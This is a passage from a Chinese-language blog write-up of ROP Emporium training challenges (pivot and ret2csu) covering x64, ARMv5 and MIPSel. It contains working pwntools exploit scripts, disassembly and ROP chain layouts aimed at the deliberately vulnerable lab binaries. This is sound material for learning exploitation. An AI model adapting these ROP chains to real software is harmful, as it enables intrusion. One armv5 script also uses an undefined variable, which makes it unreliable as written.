class="string">&#x27;./libpivot_mipsel.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">foothold_plt     = <span class="number">0x00400E60</span></span><br><span class="line">foothold_got_plt = elf.got[<span class="string">&#x27;foothold_function&#x27;</span>] <span class="comment">#0x00412060</span></span><br><span class="line">foothold_sym = libp.symbols[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line">ret2win_sym  = libp.symbols[<span class="string">&#x27;ret2win&#x27;</span>]</span><br><span class="line">offset = <span class="built_in">int</span>(ret2win_sym - foothold_sym)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(foothold_plt), <span class="built_in">hex</span>(foothold_got_plt))</span><br><span class="line"></span><br><span class="line">mov_sp_fp = <span class="number">0x00400CD0</span></span><br><span class="line">lw_t9_t0_jalr_t9 = <span class="number">0x00400CA0</span></span><br><span class="line">add_t0_t1 = <span class="number">0x00400CC4</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">leakaddr  = <span class="built_in">int</span>(io.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload_1 = p32(leakaddr)</span><br><span class="line">payload_1 += p32(lw_t9_t0_jalr_t9)</span><br><span class="line">payload_1 += <span class="string">b&quot;AAAA&quot;</span> * <span class="number">2</span></span><br><span class="line">payload_1 += p32(foothold_plt)</span><br><span class="line"></span><br><span class="line">payload_1 += <span class="string">b&quot;BBBB&quot;</span></span><br><span class="line">payload_1 += p32(foothold_got_plt)</span><br><span class="line">payload_1 += p32(lw_t9_t0_jalr_t9)</span><br><span class="line"></span><br><span class="line">payload_1 += <span class="string">b&quot;CCCC&quot;</span></span><br><span class="line">payload_1 += p32(offset)</span><br><span class="line">payload_1 += p32(add_t0_t1)</span><br><span class="line"></span><br><span class="line">payload_2 = <span class="string">b&quot;A&quot;</span> * <span class="number">0x20</span></span><br><span class="line">payload_2 += p32(leakaddr - <span class="number">4</span>)</span><br><span class="line">payload_2 += p32(mov_sp_fp)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">io.send(payload_1)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">io.send(payload_2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="ret2csu">ret2csu</h2>
<h3 id="x64">x64</h3>
<p>这道题的考点在于需要利用<code>libc_csu_init</code>的指令构造gadget，因此名字为<code>ret2csu</code>。</p>
<h4 id="分析-3">分析</h4>
<p>打开压缩包，发现存在5个文件如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ tree</span><br><span class="line">.</span><br><span class="line">├── encrypted_flag.dat</span><br><span class="line">├── exp.py</span><br><span class="line">├── key.dat</span><br><span class="line">├── libret2csu.so</span><br><span class="line">└── ret2csu</span><br><span class="line"></span><br><span class="line">0 directories, 5 files</span><br></pre></td></tr></table></figure>
<p>首先将ret2csu拖入IDA，发现main函数中直接调用了pwnme外部函数，且userfulFunction函数中直接调用ret2win外部函数。因此直接查看<code>libret2csu.so</code>中的内容，发现pwnme函数和ret2win函数内容如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pwnme</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ret2csu by ROP Emporium&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;x86_64\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">ret2win</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  FILE *streama; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0xDEADBEEFDEADBEEF</span>LL &amp;&amp; a2 == <span class="number">0xCAFEBABECAFEBABE</span>LL &amp;&amp; a3 == <span class="number">0xD00DF00DD00DF00D</span>LL )</span><br><span class="line">  &#123;</span><br><span class="line">    stream = fopen(<span class="string">&quot;encrypted_flag.dat&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !stream )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Failed to open encrypted_flag.dat&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    g_buf = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x21</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( !g_buf )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Could not allocate memory&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    g_buf = fgets(g_buf, <span class="number">33</span>, stream);</span><br><span class="line">    fclose(stream);</span><br><span class="line">    <span class="keyword">if</span> ( a1 != <span class="number">0xDEADBEEFDEADBEEF</span>LL )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Incorrect parameters&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    streama = fopen(<span class="string">&quot;key.dat&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !streama )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Failed to open key.dat&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">      g_buf[i] ^= fgetc(streama);</span><br><span class="line">    *(_QWORD *)(g_buf + <span class="number">4</span>) ^= <span class="number">0xDEADBEEFDEADBEEF</span>LL;</span><br><span class="line">    *(_QWORD *)(g_buf + <span class="number">12</span>) ^= <span class="number">0xCAFEBABECAFEBABE</span>LL;</span><br><span class="line">    *(_QWORD *)(g_buf + <span class="number">20</span>) ^= <span class="number">0xD00DF00DD00DF00D</span>LL;</span><br><span class="line">    <span class="built_in">puts</span>(g_buf);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Incorrect parameters&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看出pwnme函数中的<code>read(0, &amp;s, 0x200uLL);</code>存在溢出漏洞，且pwnme函数提示<code>Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.</code>，因此查看该网页内容，发现提示需要构造pop链到<code>__libc_csu_init()</code>中的指令。</p>
<p>若想要ret2win函数成功执行，则其三个参数需要分别为<code>0xDEADBEEFDEADBEEF, 0xCAFEBABECAFEBABE, 0xD00DF00DD00DF00D</code>，然而userfulFunction函数中调用ret2win时参数分别为<code>1, 2, 3</code>，因此无法直接将pwnme函数的返回地址覆盖为userfulFunction函数地址，还是需要利用其他gadget，结合pwnme函数中的提示，查看<code>libc_csu_init</code>处指令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400680 loc_400680:                             ; CODE XREF: __libc_csu_init+54↓j</span><br><span class="line">.text:0000000000400680                 mov     rdx, r15</span><br><span class="line">.text:0000000000400683                 mov     rsi, r14</span><br><span class="line">.text:0000000000400686                 mov     edi, r13d</span><br><span class="line">.text:0000000000400689                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040068D                 add     rbx, 1</span><br><span class="line">.text:0000000000400691                 cmp     rbp, rbx</span><br><span class="line">.text:0000000000400694                 jnz     short loc_400680</span><br><span class="line">.text:0000000000400696</span><br><span class="line">.text:0000000000400696 loc_400696:                             ; CODE XREF: __libc_csu_init+34↑j</span><br><span class="line">.text:0000000000400696                 add     rsp, 8</span><br><span class="line">.text:000000000040069A                 pop     rbx</span><br><span class="line">.text:000000000040069B                 pop     rbp</span><br><span class="line">.text:000000000040069C                 pop     r12</span><br><span class="line">.text:000000000040069E                 pop     r13</span><br><span class="line">.text:00000000004006A0                 pop     r14</span><br><span class="line">.text:00000000004006A2                 pop     r15</span><br><span class="line">.text:00000000004006A4                 retn</span><br></pre></td></tr></table></figure>
<p>发现<code>0x40069A</code>处开始的pop指令将栈上数据分别弹出给相关寄存器，且<code>0x400680</code>处开始的指令分别将<em>r15，r14，r13d</em>寄存器复制给<em>rdx，rsi，edi</em> 寄存器，然后call指令将r12+rbx*8作为地址指向的数据进行调用，刚开始存在疑点，在于如何构造r12和rbx，使得其作为地址指向ret2win函数，后面参考了<a target="_blank" rel="noopener" href="https://blog.csdn.net/AcSuccess/article/details/104448463">这篇文章</a>，才知道可以通过构造特定值，忽略此处的call指令，使得其继续执行接下来的指令，通过再次执行retn指令跳转到ret2win函数。</p>
<blockquote>
<p>call qword ptr [r12+rbx*8]将会间接跳转，需要其正常返回，而且不破坏原有rdx，rsi，rdi寄存器的值。</p>
<p>发现0x4006B0处的<strong>rep retn</strong>指令满足该规则，且0x600DF8处的值恰好为<code>004006b0</code>，因此r12+rbx*8的值应当为0x600DF8，可以使得<strong>call qword ptr [r12+rbx*8]</strong> 直接返回，不影响前面的指令结果。</p>
</blockquote>
<p>接下来依次运行add指令、cmp指令和jnz指令，为使得能够正常运行后面的pop指令，可以在第一次pop时将rbx赋值为0，rbp赋值为1。</p>
<p>值得注意的是，<strong>mov edi, r13d</strong> 指令仅修改了edi寄存器，对rdi寄存器的高32位未进行修改，因此在第2次retn时，不能直接跳转到ret2win函数，需要先跳转到修改rdi的gadget位置，再返回时跳转到ret2win函数。</p>
<p>查看是否存在修改rdi寄存器的gadget：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ret2csu --only <span class="string">&quot;pop|ret&quot;</span> | grep rdi</span><br><span class="line">0x00000000004006a3 : pop rdi ; ret</span><br></pre></td></tr></table></figure>
<h4 id="编写exp-3">编写exp</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ret2csu&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rbx_rbp_r12__r15 = <span class="number">0x40069A</span></span><br><span class="line">mov_call = <span class="number">0x400680</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004006a3</span></span><br><span class="line">ret2win = <span class="number">0x400510</span></span><br><span class="line">init_array_end = <span class="number">0x0000000000600df8</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * (<span class="number">0x20</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(pop_rbx_rbp_r12__r15)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(init_array_end)</span><br><span class="line">payload += p64(<span class="number">0xDEADBEEFDEADBEEF</span>)</span><br><span class="line">payload += p64(<span class="number">0xCAFEBABECAFEBABE</span>)</span><br><span class="line">payload += p64(<span class="number">0xD00DF00DD00DF00D</span>)</span><br><span class="line">payload += p64(mov_call)</span><br><span class="line">payload += <span class="string">b&quot;BBBBBBBB&quot;</span> * <span class="number">7</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0xDEADBEEFDEADBEEF</span>)</span><br><span class="line">payload += p64(ret2win)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h4 id="运行结果-3">运行结果</h4>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ python exp.py </span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./ret2csu&#x27;</span>: pid 5986</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Process <span class="string">&#x27;./ret2csu&#x27;</span> stopped with <span class="built_in">exit</span> code 0 (pid 5986)</span><br><span class="line">ret2csu by ROP Emporium</span><br><span class="line">x86_64</span><br><span class="line"></span><br><span class="line">Check out https://ropemporium.com/challenge/ret2csu.html <span class="keyword">for</span> information on how to solve this challenge.</span><br><span class="line"></span><br><span class="line">&gt; Thank you!</span><br><span class="line">ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure>
<h3 id="armv5-2">armv5</h3>
<h4 id="分析-4">分析</h4>
<p>利用原理和x64类似，均需要利用 <code>libc_csu_init</code>处的指令构造gadget，首先查看该处指令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:00010624 loc_10624                               ; CODE XREF: __libc_csu_init+50↓j</span><br><span class="line">.text:00010624                 ADD     R4, R4, #1</span><br><span class="line">.text:00010628                 LDR     R3, [R5],#4</span><br><span class="line">.text:0001062C                 MOV     R2, R9</span><br><span class="line">.text:00010630                 MOV     R1, R8</span><br><span class="line">.text:00010634                 MOV     R0, R7</span><br><span class="line">.text:00010638                 BLX     R3</span><br><span class="line">.text:0001063C                 CMP     R6, R4</span><br><span class="line">.text:00010640                 BNE     loc_10624</span><br><span class="line">.text:00010644                 LDMFD   SP!, &#123;R4-R10,PC&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到<strong>LDMFD SP!, {R4-R10,PC}</strong>指令将栈上的数据弹出给寄存器R4到R10和PC，而从<code>0001062C</code>开始的三条<strong>mov</strong>指令分别将<em>R9，R8，R7</em>三个寄存器复制给<em>R2，R1，R0</em>，刚好为ret2win函数所需的三个参数寄存器，因此<em>R9，R8，R7</em>三个寄存器值应当复制为ret2win的三个参数，接下来的<strong>BLX R3</strong>指令将会跳转到<em>R3</em>处，因此R3寄存器应当指向<code>libc_csu_fini</code>，即<code>00010650</code>，为了<strong>CMP</strong>指令后的<strong>BNE</strong>指令不发生跳转，<em>R6</em>和<em>R4</em> 寄存器值应当一致，接下来再次运行<strong>LDMFD SP!, {R4-R10,PC}</strong> 指令，此时只需要将需要复制给PC寄存器的栈上数据值写为ret2win的地址即可，</p>
<p>由于需要控制R3寄存器的值，寻找相关gadget：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ret2csu_armv5 --only <span class="string">&quot;pop&quot;</span> | grep r3</span><br><span class="line">0x00010474 : pop &#123;r3, pc&#125;</span><br></pre></td></tr></table></figure>
<p>因此栈布局如下：</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">-+------------+-</span><br><span class="line"> +  padding   +</span><br><span class="line"> +------------+</span><br><span class="line"> + 0x00010474 + pop_r3_pc</span><br><span class="line"> +------------+</span><br><span class="line"> + 0x00010650 + R3</span><br><span class="line"> +------------+</span><br><span class="line"> + 0x00010644 +	pop_r4__r10_pc</span><br><span class="line"> +------------+</span><br><span class="line"> +     0      +</span><br><span class="line"> +------------+</span><br><span class="line"> +   BBBB     +</span><br><span class="line"> +------------+</span><br><span class="line"> +     0      +</span><br><span class="line"> +------------+</span><br><span class="line"> +    arg1    +</span><br><span class="line"> +------------+</span><br><span class="line"> +    arg2    +</span><br><span class="line"> +------------+</span><br><span class="line"> +    arg3    +</span><br><span class="line"> +------------+</span><br><span class="line"> +   BBBBB    +</span><br><span class="line"> +------------+</span><br><span class="line"> +  00010624  + mov_arg</span><br><span class="line"> +------------+ -</span><br><span class="line"> +            +  </span><br><span class="line"> +            + 0x4 * 7</span><br><span class="line"> +            +</span><br><span class="line"> +------------+</span><br><span class="line"> +  ret2win   +</span><br><span class="line"> +------------+</span><br></pre></td></tr></table></figure>
<h4 id="编写exp-4">编写exp</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line">context.bits = <span class="number">32</span></span><br><span class="line"></span><br><span class="line">ret2win = <span class="number">0x0010498</span></span><br><span class="line">arg1, arg2, arg3 = <span class="number">0xDEADBEEF</span>, <span class="number">0xCAFEBABE</span>, <span class="number">0xD00DF00D</span></span><br><span class="line">pop_r4__r10_pc = <span class="number">0x00010644</span></span><br><span class="line">pop_r3_pc = <span class="number">0x00010474</span></span><br><span class="line">mov_arg = <span class="number">0x0001062C</span></span><br><span class="line">csu_fini = <span class="number">0x00010650</span></span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&#x27;qemu-arm&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/arm-linux-gnueabi/&#x27;</span>, <span class="string">&#x27;./ret2csu_armv5&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&quot;A&quot;</span> * (<span class="number">0x24</span>)</span><br><span class="line">payload += p32(pop_r3_pc)</span><br><span class="line">payload += p32(csu_fini)</span><br><span class="line">payload += p32(pop_r4__r10_pc)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(arrray_end)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(arg1)</span><br><span class="line">payload += p32(arg2)</span><br><span class="line">payload += p32(arg3)</span><br><span class="line">payload += <span class="string">b&quot;AAAA&quot;</span></span><br><span class="line">payload += p32(mov_arg)</span><br><span class="line">payload += <span class="string">b&quot;BBBB&quot;</span> * <span class="number">7</span> </span><br><span class="line">payload += p32(ret2win)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h4 id="运行结果-4">运行结果</h4>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ python exp.py </span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;/usr/bin/qemu-arm&#x27;</span>: pid 4638</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">ret2csu by ROP Emporium</span><br><span class="line">ARMv5</span><br><span class="line"></span><br><span class="line">Check out https://ropemporium.com/challenge/ret2csu.html <span class="keyword">for</span> information on how to solve this challenge.</span><br><span class="line"></span><br><span class="line">&gt; Thank you!</span><br><span class="line">ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure>
<h4 id="armv5-hf">armv5-hf</h4>
<p>这里只给出exp，不做详细解释，值的注意的是lib_csu_init的代码为thumb模式代码，需要进行指令模式切换。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.arch = &#x27;arm&#x27;</span><br><span class="line">context.endian = &#x27;little&#x27;</span><br><span class="line">context.bits = 32</span><br><span class="line"></span><br><span class="line">ret2win = 0x000104A4</span><br><span class="line">arg1, arg2, arg3 = 0xDEADBEEF, 0xCAFEBABE, 0xD00DF00D</span><br><span class="line">pop_r3__r9_pc = 0x00010622</span><br><span class="line">mov_arg = 0x00010616</span><br><span class="line">array_end = 0x00010630</span><br><span class="line"></span><br><span class="line">p = process([&#x27;qemu-arm&#x27;, &#x27;-L&#x27;, &#x27;/usr/arm-linux-gnueabihf/&#x27;, &#x27;./ret2csu_armv5-hf&#x27;])</span><br><span class="line"></span><br><span class="line">payload = b&quot;A&quot; * (0x24)</span><br><span class="line"></span><br><span class="line">payload += p32(pop_r3__r9_pc + 1)</span><br><span class="line">payload += p32(array_end+1) # r3</span><br><span class="line">payload += p32(0)           # r4</span><br><span class="line">payload += p32(0)           # r5</span><br><span class="line">payload += p32(0)           # r6</span><br><span class="line">payload += p32(arg1)</span><br><span class="line">payload += p32(arg2)</span><br><span class="line">payload += p32(arg3)</span><br><span class="line">payload += p32(mov_arg+1)</span><br><span class="line"></span><br><span class="line">payload += b&quot;BBBB&quot; * 7</span><br><span class="line">payload += p32(ret2win)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="mipsel-2">mipsel</h3>
<h4 id="分析-5">分析</h4>
<p>利用原理和上题类似，都是利用<code>libc_csu_init</code>中存在的gadget将所需参数写入参数寄存器 <em>a0, a1, a2</em> 中，因此直接查看<code>libc_csu_init</code>中的gadget：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:004009A0                               loc_4009A0:                              # CODE XREF: __libc_csu_init+78↓j</span><br><span class="line">.text:004009A0 00 00 19 8E                   lw      $t9, 0($s0)</span><br><span class="line">.text:004009A4 01 00 31 26                   addiu   $s1, 1</span><br><span class="line">.text:004009A8 25 30 A0 02                   move    $a2, $s5</span><br><span class="line">.text:004009AC 25 28 80 02                   move    $a1, $s4</span><br><span class="line">.text:004009B0 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:004009B4 25 20 60 02                   move    $a0, $s3</span><br><span class="line">.text:004009B4</span><br><span class="line">.text:004009B8 F9 FF 51 16                   bne     $s2, $s1, loc_4009A0</span><br><span class="line">.text:004009BC 04 00 10 26                   addiu   $s0, 4</span><br><span class="line">.text:004009BC</span><br><span class="line">.text:004009C0</span><br><span class="line">.text:004009C0                               loc_4009C0:                              # CODE XREF: __libc_csu_init+58↑j</span><br><span class="line">.text:004009C0 34 00 BF 8F                   lw      $ra, 0x1C+var_s18($sp)</span><br><span class="line">.text:004009C4 30 00 B5 8F                   lw      $s5, 0x1C+var_s14($sp)</span><br><span class="line">.text:004009C8 2C 00 B4 8F                   lw      $s4, 0x1C+var_s10($sp)</span><br><span class="line">.text:004009CC 28 00 B3 8F                   lw      $s3, 0x1C+var_sC($sp)</span><br><span class="line">.text:004009D0 24 00 B2 8F                   lw      $s2, 0x1C+var_s8($sp)</span><br><span 